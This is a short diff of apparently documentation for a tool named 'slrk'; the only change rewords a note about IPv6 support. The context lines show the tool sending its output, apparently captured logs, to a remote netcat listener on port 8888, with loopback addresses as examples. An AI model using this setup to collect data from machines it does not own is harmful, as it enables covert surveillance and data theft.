@@ -15,7 +15,7 @@ EXAMPLE:<br><br>
 Server$ nc -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
 
-<br>---It works with ipv6 also---<br><br>
+<br>--- It works also with ipv6--- <br><br>
 Server$ nc -6 -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a ::1 -p 8888
 __________________________________________________________________________
